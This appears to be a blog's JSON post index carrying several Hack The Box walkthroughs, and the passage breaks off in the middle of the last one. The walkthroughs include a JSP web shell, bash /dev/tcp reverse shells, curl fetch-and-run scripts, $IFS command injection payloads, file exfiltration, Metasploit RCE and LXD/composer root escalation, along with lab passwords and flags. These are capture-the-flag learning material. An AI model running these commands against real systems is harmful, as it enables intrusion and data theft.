[ { "title": "Tabby from HTB", "url": "/posts/Tabby-from-HTB/", "categories": "Hack The Box", "tags": "Hack The Box", "date": "2024-09-09 00:00:00 +0000", "snippet": "Tabby from HTBnmap Gave this:PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 45:3c:34:14:35:56:23:95:d6:83:4e:26:de:c6:5b:d9 (RSA)| 256 89:79:3a:9c:88:b0:5c:ce:4b:79:b1:02:23:4b:44:a6 (ECDSA)|_ 256 1e:e7:b9:55:dd:25:8f:72:56:e8:8e:65:d5:19:b0:8d (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-title: Mega Hosting|_http-server-header: Apache/2.4.41 (Ubuntu)8080/tcp open http Apache Tomcat|_http-open-proxy: Proxy might be redirecting requests|_http-title: Apache TomcatFirst access the 80 port with IP and after clicking things we find this redirect link, so we have to add this to /etc/hosts10.10.10.194 megahosting.htbThe URL is like thishttp://megahosting.htb/news.php?file=statementWhich indicates that there may be possible to do LFI, that means we can read another files like /etc/passwd, so we have to try waysI guess the file statement will be located in /var/www/html or one directory above.Trying ../../../etc/passwd gave nothing so lets do going back 4 directories ../../../../etc/passwdroot:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false sshd:x:111:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false tomcat:x:997:997::/opt/tomcat:/bin/false mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false ash:x:1000:1000:clive:/home/ash:/bin/bashSo we can read files now.Now access the 8080 PORTaccessing [http://10.10.10.194:8080/manager/html] it tells us to authorize and clicking cancel tells us thisYou are not authorized to view this page. If you have not changed any configuration files, please examine the file conf/tomcat-users.xml in your installation. That file must contain the credentials to let you use this webapp.Searching tomcat9 directories we find this usr/share/tomcat9/etc/tomcat-users.xml now reading that gave us things&lt;role rolename=\"admin-gui\"/&gt; &lt;role rolename=\"manager-script\"/&gt; &lt;user username=\"tomcat\" password=\"$3cureP4s5w0rd123!\" roles=\"admin-gui,manager-script\"/&gt;&lt;/tomcat-users&gt; tomcat$3cureP4s5w0rd123!Using this credentials we can’t access that same page.So let’s search for directories in /manager directory.wfuzz -c -w /usr/share/wordlists/dirb/common.txt --hc 404 http://10.10.10.194:8080/manager/FUZZ000000001: 302 0 L 0 W 0 Ch \"http://10.10.10.194:8080 /manager/\"000001939: 401 63 L 291 W 2499 Ch \"html\"000001991: 302 0 L 0 W 0 Ch \"images\"000003850: 401 63 L 291 W 2499 Ch \"status\"000004024: 401 63 L 291 W 2499 Ch \"text\"Nothing unusual except text searching that shows that commands can be executed from this directory.The following commands are supported: list add remove start stop persist deploywe will need to deploy an cmd to tomcat9 which should be .jsp.git clone https://github.com/tennc/webshell.gitcd /webshell/jspWe’ll use cmdjsp.jsp but just know you have to remove cmd.exe /C because it’s a Linux machine, change the METHOD to POST, and probably the name if you want.should look like this// note that linux = cmd and windows = \"cmd.exe /c + cmd\"&lt;FORM METHOD=POST ACTION='cmdjsp.jsp'&gt;&lt;INPUT name='help' type=text&gt;&lt;INPUT type=submit value='Run'&gt;&lt;/FORM&gt;&lt;%@ page import=\"java.io.*\" %&gt;&lt;% String cmd = request.getParameter(\"help\"); String output = \"\"; if(cmd != null) { String s = null; try { Process p = Runtime.getRuntime().exec(cmd); BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream())); while((s = sI.readLine()) != null) { output += s; } } catch(IOException e) { e.printStackTrace(); } }%&gt;&lt;pre&gt;&lt;%=output %&gt;&lt;/pre&gt;now to upload the file we will need curlcurl -u 'tomcat:$3cureP4s5w0rd123!' http://10.10.10.194:8080/manager/text/deploy?path=/app -T cmd.warOK - Deployed application at context path [/app]now to find the uploaded file and to run commands go to this [http://10.10.10.194:8080/app/cmdjsp.jsp]Run the command like id and if it doesn’t work you have to change something.To get reverse shell you need to create an reverse shell script#!/bin/bashbash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.11/4444 0&gt;&amp;1'Then start an python3 simple serverpython3 -m http.server 80and with curl from machine take that reverse shell script put it to a file and then execute it.curl 10.10.16.11:80/reverse.sh -o /dev/shm/reverse.shbash /dev/shm/reverse.shThis will get you a connection on netcatrlwrap nc -nvlp 4444listening on [any] 4444 ...connect to [10.10.16.11] from (UNKNOWN) [10.10.10.194] 46504bash: cannot set terminal process group (985): Inappropriate ioctl for devicebash: no job control in this shelltomcat@tabby:/var/lib/tomcat9$we find .zip file in /var/www/html/files so let’s check it.tomcat@tabby:/var/www/html/files$ lsls16162020_backup.zip archive revoked_certs statementto forward it to machine without wasting time just base64 encode the .zip file, copy it, paste it into some file in your machine, decode it and forward it to backup.zipbase64 -d backup.b64 &gt; backup.zipunzip backup.zipArchive: backup.zip creating: var/www/html/assets/[backup.zip] var/www/html/favicon.ico password:It needs some password we don’t know. So let’s use zip2john to get the hash and then crack it.zip2john backup.zip &gt; hashjohn hash -w=/usr/share/wordlists/rockyou.txtUsing default input encoding: UTF-8Loaded 1 password hash (PKZIP [32/64])Will run 8 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statusadmin@it (backup.zip)1g 0:00:00:01 DONE (2024-09-09 19:01) 0.7575g/s 7856Kp/s 7856Kc/s 7856KC/s adornadis..adamsapple:)1Use the \"--show\" option to display all of the cracked passwords reliablySession completed.So the password is admin@itExploring the .zip file there is nothing interesting. We can use this password to try to login as ash and it works!User Flag is:fa4cbf19892c8bbb002e9042a35b333anow for privilege escalationash@tabby:~$ iduid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)Searching all that only with lxd we are able to do privilege escalationI will be using this https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalationand also https://www.hackingarticles.in/lxd-privilege-escalation/Only one didn’t work for me so i combined them and got root shellgit clone https://github.com/saghul/lxd-alpine-builder.gitcd lxd-alpine-builder./build-alpinepython -m http.server 80Now on machinecd /tmpwget 10.10.16.11/alpine-v3.20-x86_64-20240909_2042.tar.gzlxc image import ./alpine-v3.20-x86_64-20240909_2042.tar.gz --alias myimageash@tabby:/tmp$ lxc image list+---------+--------------+--------+-------------------------------+--------------+-----------+--------+-----------------------------+| ALIAS | FINGERPRINT | PUBLIC | DESCRIPTION | ARCHITECTURE | TYPE | SIZE | UPLOAD DATE |+---------+--------------+--------+-------------------------------+--------------+-----------+--------+-----------------------------+| myimage | 05ec247da965 | no | alpine v3.20 (20240909_20:42) | x86_64 | CONTAINER | 3.68MB | Sep 9, 2024 at 4:47pm (UTC) |+---------+--------------+--------+-------------------------------+--------------+-----------+--------+-----------------------------+$ lxd initWould you like to use LXD clustering? (yes/no) [default=no]:Do you want to configure a new storage pool? (yes/no) [default=yes]:Name of the new storage pool [default=default]: igniteName of the storage backend to use (dir, lvm, zfs, ceph, btrfs) [default=zfs]:Create a new ZFS pool? (yes/no) [default=yes]:Would you like to use an existing empty block device (e.g. a disk or partition)? (yes/no) [default=no]:Size in GB of the new loop device (1GB minimum) [default=5GB]:Would you like to connect to a MAAS server? (yes/no) [default=no]:Would you like to create a new local network bridge? (yes/no) [default=yes]:What should the new bridge be called? [default=lxdbr0]:What IPv4 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: noneWhat IPv6 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: noneWould you like the LXD server to be available over the network? (yes/no) [default=no]: noWould you like stale cached images to be updated automatically? (yes/no) [default=yes] noWould you like a YAML \"lxd init\" preseed to be printed? (yes/no) [default=no]:$ lxc init myimage ignite -c security.privileged=trueCreating ignite$ lxc config device add ignite host-root disk source=/ path=/mnt/root recursive=true$ lxc start ignite$ lxc exec ignite /bin/sh~# cd /mnt/root/root/mnt/root/root # lsroot.txt snapRoot Flag is:c2c3a98668aa4a106e8db9eff38adde9" }, { "title": "Omni from HTB", "url": "/posts/Omni-from-HTB/", "categories": "Hack The Box", "tags": "Hack The Box", "date": "2024-09-08 00:00:00 +0000", "snippet": "Omni from HTBnmap gave this:PORT STATE SERVICE VERSION135/tcp open msrpc Microsoft Windows RPC5985/tcp open upnp Microsoft IIS httpd8080/tcp open upnp Microsoft IIS httpd|_http-title: Site doesn't have a title.| http-auth:| HTTP/1.1 401 Unauthorized\\x0D|_ Basic realm=Windows Device Portal|_http-server-header: Microsoft-HTTPAPI/2.029817/tcp open unknown29819/tcp open arcserve ARCserve Discovery29820/tcp open unknownsearching Windows Device Portala exploit i found this github repository [https://github.com/SafeBreach-Labs/SirepRAT]python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --cmd \"C:\\Windows\\System32\\hostname.exe\" --return_output --v---------------------------omni---------------------------This told us what user we are on machine and also that we can execute commands this way.found a way to execute commandspython3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --cmd \"C:\\Windows\\System32\\cmd.exe\" --args \"/c hostname\" --return_output --v---------------------------omni---------------------------there is no netcat on machine so download it from github [https://github.com/int0x33/nc.exe/blob/master/nc64.exe] and upload it to machinepython3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --cmd \"C:\\Windows\\System32\\cmd.exe\" --args \"/c powershell IWR -Uri http://10.10.16.11:80/nc64.exe -Outfile c:\\nc64.exe\" --return_output --v------------------&lt;HResultResult | type: 1, payload length: 4, HResult: 0x0&gt;now to get shell start netcat and on windows machine send this payloadpython3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --cmd \"C:\\Windows\\System32\\cmd.exe\" --args \"/c c:\\nc64.exe -e powershell 10.10.16.11 4444\" --return_output --vI got connectionrlwrap nc -nvlp 4444listening on [any] 4444 ...connect to [10.10.16.11] from (UNKNOWN) [10.10.10.204] 49671Windows PowerShellCopyright (C) Microsoft Corporation. All rights reserved.PS C:\\windows\\system32&gt;I can’t do more i don’t know a thing about Windows exploitation T_T" }, { "title": "Doctor from HTB", "url": "/posts/Doctor-from-HTB/", "categories": "Hack The Box", "tags": "Hack The Box", "date": "2024-09-08 00:00:00 +0000", "snippet": "Doctor from HTBAfter nmap scan we discover that except 22 and 80 ports there is also 8089 port open.First check 80 port which has some static site and has nothing much.add this to /etc/hosts10.10.10.209 doctors.htbAnd after adding this and visiting doctors.htb we are in login page.signup and then loginthere is only New message which maybe we will need to do something.Checking the wappalyzer it runs Flask 1.0.1So maybe we have to do SSTI let’s check with 7 if it returns 49 then it is SSTI vulnerable and we can get reverse shell. It didn’t work.Now start python -m http.server 80 and type your tun0 into content. After typing post it and we can see that it connected to us, so we have to execute commands like that.title=test&amp;content=http://10.10.16.11/$(whoami)&amp;submit=postThis payload showed me this10.10.10.209 - - [08/Sep/2024 15:41:56] \"GET /web HTTP/1.1\" 404 -So it is web user that connects to us.title=test&amp;content=http://10.10.16.11/$(echo$IFS'help')&amp;submit=Postreturned10.10.10.209 - - [08/Sep/2024 15:46:21] \"GET /help HTTP/1.1\" 404 -so we can’t use much special characters.Now we have to upload reverse shell file and then execute ittitle=test&amp;content=http://10.10.16.11/$(curl$IFS'http://10.10.16.11/reverse.sh'$IFS'-o'$IFS'/var/www/html/reverse.sh')&amp;submit=Postthentitle=test&amp;content=http://10.10.16.11/$(bash$IFS'/var/www/html/reverse')&amp;submit=PostAnd i got connectionrlwrap nc -nvlp 4444listening on [any] 4444 ...connect to [10.10.16.11] from (UNKNOWN) [10.10.10.209] 50992bash: cannot set terminal process group (841): Inappropriate ioctl for devicebash: no job control in this shellweb@doctor:~$Exploring we find site.dbweb@doctor:~/blog/flaskblog$ file site.dbfile site.dbsite.db: SQLite 3.x database, last written using SQLite version 3032003there is no sqlite3 on machine so we have to download it on our local PC and see what is going in there.Set up netcat on some port and redirect everything it gets to some filenc -nlvp 1235 &gt; site.dblistening on [any] 1235 ...Now on machine forward site.dbweb@doctor:~/blog/flaskblog$ cat site.db &gt; /dev/tcp/10.10.16.11/1235cat site.db &gt; /dev/tcp/10.10.16.11/1235Now read the filesqlite3 site.db .dumpPRAGMA foreign_keys=OFF;BEGIN TRANSACTION;CREATE TABLE user (\tid INTEGER NOT NULL,\tusername VARCHAR(20) NOT NULL,\temail VARCHAR(120) NOT NULL,\timage_file VARCHAR(20) NOT NULL,\tpassword VARCHAR(60) NOT NULL,\tPRIMARY KEY (id),\tUNIQUE (username),\tUNIQUE (email));INSERT INTO user VALUES(1,'admin','admin@doctor.htb','default.gif','$2b$12$Tg2b8u/elwAyfQOvqvxJgOTcsbnkFANIDdv6jVXmxiWsg4IznjI0S');CREATE TABLE post (\tid INTEGER NOT NULL,\ttitle VARCHAR(100) NOT NULL,\tdate_posted DATETIME NOT NULL,\tcontent TEXT NOT NULL,\tuser_id INTEGER NOT NULL,\tPRIMARY KEY (id),\tFOREIGN KEY(user_id) REFERENCES user (id));INSERT INTO post VALUES(1,'Doctor blog','2020-09-18 20:48:37.55555','A free blog to share medical knowledge. Be kind!',1);COMMIT;There is an hashed password for admin which i guess will not be root password.it is an bcrypt so it will take forever to crack so leave it alone.checking the id command we see that we are part of adm group so we can read logsweb@doctor:/var/log/apache2$ lslsaccess.log access.log.5.gz error.log.10.gz error.log.5.gzaccess.log.1 access.log.6.gz error.log.11.gz error.log.6.gzaccess.log.10.gz access.log.7.gz error.log.12.gz error.log.7.gzaccess.log.11.gz access.log.8.gz error.log.13.gz error.log.8.gzaccess.log.12.gz access.log.9.gz error.log.14.gz error.log.9.gzaccess.log.2.gz backup error.log.2.gz other_vhosts_access.logaccess.log.3.gz error.log error.log.3.gzaccess.log.4.gz error.log.1 error.log.4.gzlet’s read backup and with CTRL+f search for word password maybe we can find it.I found 10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] \"POST /reset_password?email=Guitar123\" 50..As it seems it is password for shaun so switch to that userUser Flag is:4baad6e4e8863cd4826567f013e8d8d7User shaun-s credentials can be used to login on 8089 port, which runs on splunk build 8.0.5. Searching splunk RCE i found splunkwhisperer2 so lets download it and execute.git clone https://github.com/cnotin/SplunkWhisperer2.git/home/giorgi/Desktop/codes/SplunkWhisperer2/PySplunkWhisperer2/PySplunkWhisperer2_remote.pypython3 PySplunkWhisperer2_remote.pyusage: PySplunkWhisperer2_remote.py [-h] [--scheme SCHEME] --host HOST [--port PORT] --lhost LHOST [--lport LPORT] [--username USERNAME] [--password PASSWORD] [--payload PAYLOAD] [--payload-file PAYLOAD_FILE]PySplunkWhisperer2_remote.py: error: the following arguments are required: --host, --lhostWrite everything we know and also open another netcat listenerpython3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --port 8089 --lhost 10.10.16.11 --lport 9001 --username shaun --password Guitar123 --payload \"bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.11/9002 0&gt;&amp;1'\"Running in remote mode (Remote Code Execution)[.] Authenticating...[+] Authenticated[.] Creating malicious app bundle...[+] Created malicious app bundle in: /tmp/tmpzcm8d2g1.tar[+] Started HTTP server for remote mode[.] Installing app from: http://10.10.16.11:9001/10.10.10.209 - - [08/Sep/2024 16:56:12] \"GET / HTTP/1.1\" 200 -[+] App installed, your code should be running now!Check netcat and you should have connectionrlwrap nc -nvlp 9002listening on [any] 9002 ...connect to [10.10.16.11] from (UNKNOWN) [10.10.10.209] 56558bash: cannot set terminal process group (1138): Inappropriate ioctl for devicebash: no job control in this shellroot@doctor:/#Root Flag is:9375c052f2db21175dd11ed91f2f8368" }, { "title": "Academy from HTB", "url": "/posts/Academy-from-HTB/", "categories": "Hack The Box", "tags": "Hack The Box", "date": "2024-09-07 00:00:00 +0000", "snippet": "Academy from HTBnmap gave thisPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 c0:90:a3:d8:35:25:6f:fa:33:06:cf:80:13:a0:a5:53 (RSA)| 256 2a:d5:4b:d0:46:f0:ed:c9:3c:8d:f6:5d:ab:ae:77:96 (ECDSA)|_ 256 e1:64:14:c3:cc:51:b2:3b:a6:28:a7:b1:ae:5f:45:35 (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-title: Did not follow redirect to http://academy.htb/|_http-server-header: Apache/2.4.41 (Ubuntu)33060/tcp open mysqlx?| fingerprint-strings:| DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp:| Invalid message\"|_ HY000add this to /etc/hosts10.10.10.215 academy.htbAfter accessing the site click Registerand signupThen for directory enumerationdirsearch -u http://academy.htb[15:53:38] 200 - 968B - /admin.php[15:53:51] 200 - 0B - /config.php[15:53:59] 302 - 54KB - /home.php -&gt; login.php[15:53:59] 301 - 311B - /images -&gt; http://academy.htb/images/[15:53:59] 403 - 276B - /images/[15:54:03] 200 - 964B - /login.php[15:54:13] 200 - 1001B - /register.phpFrom here /admin.php is interesting, it takes us to login page but shows nothing interesting. Lets create new user from /register.phpbut now let’s use burpsuite + interceptto see what’s happening in backgrounduid=shavigio1&amp;password=shavigio1&amp;confirm=shavigio1&amp;roleid=0Let’s change roleidand see what it doesuid=shavigio1&amp;password=shavigio1&amp;confirm=shavigio1&amp;roleid=1After forwarding we are taken to http://academy.htb/login.php then login with user you just created, But it gives us nothing, But let’s see /admin.php we get this:Item\tStatusComplete initial set of modules (cry0l1t3 / mrb3n)\tdoneFinalize website design\tdoneTest all modules\tdonePrepare launch campaign\tdoneSeparate student and admin roles\tdoneFix issue with dev-staging-01.academy.htb\tpendingWe see subdomain dev-staging-01 add that to /etc/hosts and open that subdomainafter eploring we can read that it uses laravel but we don’t know the version so we have to risk it.In searchsploit search laravel and we’ll usePHP Laravel Framework 5.5.40 / 5.6.x &lt; 5.6.30 - token Unserialize Remote Command Execution (Metasploit) | linux/remote/47129.rbin Metasploitmsf6 &gt; search laravelMatching Modules================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/unix/http/laravel_token_unserialize_exec 2018-08-07 excellent Yes PHP Laravel Framework token Unserialize Remote Command Execution 1 exploit/multi/php/ignition_laravel_debug_rce 2021-01-13 excellent Yes Unauthenticated remote code execution in Ignition 2 \\_ target: Unix (In-Memory) . . . . 3 \\_ target: Windows (In-Memory) . . . .msf6 &gt; use exploit/unix/http/laravel_token_unserialize_exec[*] Using configured payload cmd/unix/reverse_perlmsf6 exploit(unix/http/laravel_token_unserialize_exec) &gt; set APP_KEY dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=APP_KEY =&gt; dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=msf6 exploit(unix/http/laravel_token_unserialize_exec) &gt; set LHOST 10.10.16.11LHOST =&gt; 10.10.16.11msf6 exploit(unix/http/laravel_token_unserialize_exec) &gt; set LPORT 1234LPORT =&gt; 1234msf6 exploit(unix/http/laravel_token_unserialize_exec) &gt; set RHOST 10.10.10.215RHOST =&gt; 10.10.10.215msf6 exploit(unix/http/laravel_token_unserialize_exec) &gt; set RHOST dev-staging-01.academy.htbRHOST =&gt; dev-staging-01.academy.htbmsf6 exploit(unix/http/laravel_token_unserialize_exec) &gt; set VHOST dev-staging-01.academy.htbVHOST =&gt; dev-staging-01.academy.htbmsf6 exploit(unix/http/laravel_token_unserialize_exec) &gt; run[*] Started reverse TCP handler on 10.10.16.11:1234[*] Command shell session 1 opened (10.10.16.11:1234 -&gt; 10.10.10.215:52356) at 2024-09-07 16:36:34 +0400lscssfavicon.icoindex.phpjsrobots.txtweb.configWe got interactive shell. Yippe!then to get fully interactive reverse shell use this payloadbash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.11/9001 0&gt;&amp;1'this will give connection on netcat rlwrap nc -nvlp 9001listening on [any] 9001 ...connect to [10.10.16.11] from (UNKNOWN) [10.10.10.215] 41170bash: cannot set terminal process group (1021): Inappropriate ioctl for devicebash: no job control in this shellwww-data@academy:/var/www/html/htb-academy-dev-01/public$in /var/www/html/academy$we find .env file which contains password for mysql login but none of the mentioned names in that file gives us connection to mysqlso we’ll have to use one of the users from /etc/passwd, well we didn’t get connection on mysqlbut we can switch to cry0l1t3 with this passwordsu cry0l1t3Password: mySup3rP4s5w0rd!!$ ididuid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm)User Flag is:773ba55ce9af653ba3a98522f5ed83careading the output id gives the adm group is interesting adm: Group adm is used for system monitoring tasks. Members of this group can read many log files in /var/log, and can use xconsole. Historically, /var/log was /usr/adm (and later /var/adm), thus the name of the group.listing the files in /var/log/ we see audit which may contain password for other user to read audit logs we have to useaureport --ttyTTY Report===============================================# date time event auid term sess comm data===============================================Error opening config file (Permission denied)NOTE - using built-in logs: /var/log/audit/audit.log1. 08/12/2020 02:28:10 83 0 ? 1 sh \"su mrb3n\",&lt;nl&gt;2. 08/12/2020 02:28:13 84 0 ? 1 su \"mrb3n_Ac@d3my!\",&lt;nl&gt;3. 08/12/2020 02:28:24 89 0 ? 1 sh \"whoami\",&lt;nl&gt;4. 08/12/2020 02:28:28 90 0 ? 1 sh \"exit\",&lt;nl&gt;5. 08/12/2020 02:28:37 93 0 ? 1 sh \"/bin/bash -i\",&lt;nl&gt;Now we can switch to mrb3n$ sudo -lsudo -l[sudo] password for mrb3n: mrb3n_Ac@d3my!Matching Defaults entries for mrb3n on academy: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser mrb3n may run the following commands on academy: (ALL) /usr/bin/composerSo we can run composer with root Permissionin https://gtfobins.github.io/gtfobins/composer/ we can do privilege escalation$ TF=$(mktemp -d)echo '{\"scripts\":{\"x\":\"/bin/sh -i 0&lt;&amp;3 1&gt;&amp;3 2&gt;&amp;3\"}}' &gt;$TF/composer.jsonTF=$(mktemp -d)$ echo '{\"scripts\":{\"x\":\"/bin/sh -i 0&lt;&amp;3 1&gt;&amp;3 2&gt;&amp;3\"}}' &gt;$TF/composer.json$ sudo composer --working-dir=$TF run-script xDo not run Composer as root/super user! See https://getcomposer.org/root for details&gt; /bin/sh -i 0&lt;&amp;3 1&gt;&amp;3 2&gt;&amp;3# # ididuid=0(root) gid=0(root) groups=0(root)The Root Flag is:eb28f848975237f3a2b2c41a63edef9e" }, { "title": "TwoMillion from HTB", "url": "/posts/twomillion-from-HTB/", "categories": "Hack The Box", "tags": "Hack The Box", "date": "2024-09-06 00:00:00 +0000", "snippet": "TwoMillion from HTBpageNmap gave this:$ nmap -sCV --min-rate 4000 -Pn 10.10.11.221Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-06 21:16 +04Nmap scan report for 2million.htb (10.10.11.221)Host is up (0.23s latency).Not shown: 918 filtered tcp ports (no-response), 80 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)|_ 256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)80/tcp open http nginx|_http-trane-info: Problem with XML parsing of /evox/about|_http-title: Hack The Box :: Penetration Testing Labs| http-cookie-flags:| /:| PHPSESSID:|_ httponly flag not setService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 18.02 secondsNothing unusual.Go to site and you can see that it is old HTBsite which was vulnerable. You can search HTB invite code exploitand do that.Open http://2million.htb/invite and Inspectit. There is Invitecode, copy that and go to de4jsand paste the copied code. Then click Auto Decode:function verifyInviteCode(code) { var formData = { \"code\": code }; $.ajax({ type: \"POST\", dataType: \"json\", data: formData, url: '/api/v1/invite/verify', success: function (response) { console.log(response) }, error: function (response) { console.log(response) } })}function makeInviteCode() { $.ajax({ type: \"POST\", dataType: \"json\", url: '/api/v1/invite/how/to/generate', success: function (response) { console.log(response) }, error: function (response) { console.log(response) } })}There is a given directory /api/v1/invite/how/to/generate. Use that to curlthe things inside that directory of the 2million.htb and read it:$ curl -X POST http://2million.htb/api/v1/invite/how/to/generate | jq{ \"0\": 200, \"success\": 1, \"data\": { \"data\": \"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr\", \"enctype\": \"ROT13\" }, \"hint\": \"Data is encrypted ... We should probbably check the encryption type in order to decrypt it...\"}Copy the text and search ROT13Decrypt and do it. You will get this:In order to generate the invite code, make a POST request to /api/v1/invite/generateDo as it says in the text:$ curl -sX POST http://2million.htb/api/v1/invite/generate | jq{ \"0\": 200, \"success\": 1, \"data\": { \"code\": \"UFdENTYtQUtMNFUtV0pCMEgtVVlYS1A=\", \"format\": \"encoded\" }}From the looks of it, it’s base64and decrypt it:$ echo \"UFdENTYtQUtMNFUtV0pCMEgtVVlYS1A=\" | base64 -dPWD56-AKL4U-WJB0H-UYXKPThis is the token for the registration.Go to 2million.htb/inviteand paste the invitation code. Then sign up.You are greeted with this page:There isn’t much of pages you can open, but there is one interesting: Access.The Access page allows a user to Download and Regenerate their VPN file to be able to access the HTBinfrastructure. Let’s fire up BurpSuite and see what the Connection Pack download button does.In BurpSuiteturn the Interceptbutton on and click the Connection Packbutton, in Burpyou will get this:GET /api/v1/user/vpn/generate HTTP/1.1Host: 2million.htbUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8Sec-GPC: 1Accept-Language: en-US,en;q=0.6Referer: http://2million.htb/home/accessAccept-Encoding: gzip, deflate, brCookie: PHPSESSID=7a0pbm0uacm9s69027tjukf5e9Connection: keep-aliveYou can see the cookie that we’ll use for curl.$ curl -sv http://2million.htb/api --cookie \"PHPSESSID=7a0pbm0uacm9s69027tjukf5e9\" | jq* Host 2million.htb:80 was resolved.* IPv6: (none)* IPv4: 10.10.11.221* Trying 10.10.11.221:80...* Connected to 2million.htb (10.10.11.221) port 80&gt; GET /api HTTP/1.1&gt; Host: 2million.htb&gt; User-Agent: curl/8.8.0&gt; Accept: */*&gt; Cookie: PHPSESSID=7a0pbm0uacm9s69027tjukf5e9&gt;* Request completely sent off&lt; HTTP/1.1 200 OK&lt; Server: nginx&lt; Date: Tue, 06 Aug 2024 17:47:06 GMT&lt; Content-Type: application/json&lt; Transfer-Encoding: chunked&lt; Connection: keep-alive&lt; Expires: Thu, 19 Nov 1981 08:52:00 GMT&lt; Cache-Control: no-store, no-cache, must-revalidate&lt; Pragma: no-cache&lt;{ [47 bytes data]* Connection #0 to host 2million.htb left intact{ \"/api/v1\": \"Version 1 of the API\"}This is what curling /apigives. Now we have to curl /api/v1:$ curl -sv http://2million.htb/api/v1 --cookie \"PHPSESSID=7a0pbm0uacm9s69027tjukf5e9\" | jq* Host 2million.htb:80 was resolved.* IPv6: (none)* IPv4: 10.10.11.221* Trying 10.10.11.221:80...* Connected to 2million.htb (10.10.11.221) port 80&gt; GET /api/v1 HTTP/1.1&gt; Host: 2million.htb&gt; User-Agent: curl/8.8.0&gt; Accept: */*&gt; Cookie: PHPSESSID=7a0pbm0uacm9s69027tjukf5e9&gt;* Request completely sent off&lt; HTTP/1.1 200 OK&lt; Server: nginx&lt; Date: Tue, 06 Aug 2024 17:48:06 GMT&lt; Content-Type: application/json&lt; Transfer-Encoding: chunked&lt; Connection: keep-alive&lt; Expires: Thu, 19 Nov 1981 08:52:00 GMT&lt; Cache-Control: no-store, no-cache, must-revalidate&lt; Pragma: no-cache&lt;{ [812 bytes data]* Connection #0 to host 2million.htb 